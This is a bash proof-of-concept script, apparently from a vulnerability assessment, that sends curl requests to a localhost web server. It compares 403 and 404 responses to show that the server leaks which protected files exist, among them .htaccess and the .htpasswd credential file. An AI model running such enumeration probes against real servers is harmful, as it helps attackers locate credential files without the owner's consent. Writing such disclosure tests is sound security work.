#!/bin/bash

# POC: Information Disclosure via HTTP 403 Response for Protected Files
# This script demonstrates how different HTTP status codes reveal file existence

TARGET="http://localhost:8080"
echo "=========================================="
echo "POC: Information Disclosure via HTTP Status Codes"
echo "=========================================="
echo ""

echo "[*] Testing file enumeration through status code analysis..."
echo ""

# Test 1: Known protected file (.htaccess) - should return 403
echo "[TEST 1] Requesting protected file: .htaccess"
HTACCESS_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/static/.htaccess")
echo "Status Code: $HTACCESS_CODE"
if [ "$HTACCESS_CODE" == "403" ]; then
    echo "Result: ✓ File EXISTS (403 Forbidden confirms presence)"
else
    echo "Result: File status unclear (got $HTACCESS_CODE)"
fi
echo ""

# Test 2: Non-existent file - should return 404
echo "[TEST 2] Requesting non-existent file: nonexistent.txt"
NONEXIST_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/static/nonexistent.txt")
echo "Status Code: $NONEXIST_CODE"
if [ "$NONEXIST_CODE" == "404" ]; then
    echo "Result: ✓ File does NOT exist (404 Not Found)"
else
    echo "Result: Unexpected status (got $NONEXIST_CODE)"
fi
echo ""

# Test 3: Another potential protected file (.htpasswd)
echo "[TEST 3] Requesting potential protected file: .htpasswd"
HTPASSWD_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/static/.htpasswd")
echo "Status Code: $HTPASSWD_CODE"
if [ "$HTPASSWD_CODE" == "403" ]; then
    echo "Result: ✓ File EXISTS (403 Forbidden confirms presence)"
elif [ "$HTPASSWD_CODE" == "404" ]; then
    echo "Result: File does NOT exist (404 Not Found)"
else
    echo "Result: Unexpected status (got $HTPASSWD_CODE)"
fi
echo ""

# Test 4: Another non-existent file for comparison
echo "[TEST 4] Requesting non-existent file: .gitignore"
GITIGNORE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/static/.gitignore")
echo "Status Code: $GITIGNORE_CODE"
if [ "$GITIGNORE_CODE" == "404" ]; then
    echo "Result: ✓ File does NOT exist (404 Not Found)"
elif [ "$GITIGNORE_CODE" == "403" ]; then
    echo "Result: File EXISTS (403 Forbidden confirms presence)"
else
    echo "Result: Unexpected status (got $GITIGNORE_CODE)"
fi
echo ""

# Analysis
echo "=========================================="
echo "VULNERABILITY ANALYSIS"
echo "=========================================="
echo ""

if [ "$HTACCESS_CODE" == "403" ] && [ "$NONEXIST_CODE" == "404" ]; then
    echo "[VULNERABLE] The server reveals file existence through status codes:"
    echo "  - Protected files return: 403 Forbidden (file exists but access denied)"
    echo "  - Non-existent files return: 404 Not Found (file doesn't exist)"
    echo ""
    echo "IMPACT: An attacker can enumerate which sensitive files exist by"
    echo "analyzing HTTP response codes, even though content is protected."
    echo ""
    echo "FILES CONFIRMED TO EXIST:"
    [ "$HTACCESS_CODE" == "403" ] && echo "  ✓ .htaccess (Status: 403)"
    [ "$HTPASSWD_CODE" == "403" ] && echo "  ✓ .htpasswd (Status: 403)"
    echo ""
    echo "FILES CONFIRMED NOT TO EXIST:"
    [ "$NONEXIST_CODE" == "404" ] && echo "  ✗ nonexistent.txt (Status: 404)"
    [ "$GITIGNORE_CODE" == "404" ] && echo "  ✗ .gitignore (Status: 404)"
    echo ""
    exit 0
else
    echo "[NOT VULNERABLE] Server returns uniform status codes"
    exit 1
fi